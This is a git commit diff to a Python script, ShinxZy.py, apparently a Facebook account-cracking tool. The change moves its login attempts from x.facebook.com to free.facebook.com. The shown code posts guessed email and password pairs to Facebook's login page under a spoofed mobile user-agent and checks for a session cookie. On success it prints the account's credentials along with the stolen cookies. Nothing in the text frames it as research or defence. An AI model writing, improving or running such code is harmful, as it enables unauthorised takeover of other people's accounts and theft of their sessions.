b806be66934a49e4d339d1fc14a8042a3165f2e9
Muhammad Zainul umam <93089530+Shinzy24@users.noreply.github.com>
2022-01-11 06:22:23 +0700

    Update ShinxZy.py

--- ShinxZy.py
+++ ShinxZy.py
@@ -652,7 +652,7 @@ class __crack__:
         elif ___yayanganteng___ in ('T', 't'):
             print '\n [ pilih method login - silahkan coba satu² ]\n'
             print ' [%s1%s]. method API (fast)'%(O,N)
-            print ' [%s2%s]. method X.FB (new login)'%(O,N)
+            print ' [%s2%s]. method FREEBASIC (new login)'%(O,N)
             print ' [%s3%s]. method TOUCH (REKOMENDASI)'%(O,N)
             self.__pler__()
         else:
@@ -728,8 +728,8 @@ class __crack__:
             	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
             ses = requests.Session()
             ses.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-            p = ses.get("https://x.facebook.com")
-            b = ses.post("https://x.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
+            p = ses.get("https://free.facebook.com")
+            b = ses.post("https://free.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
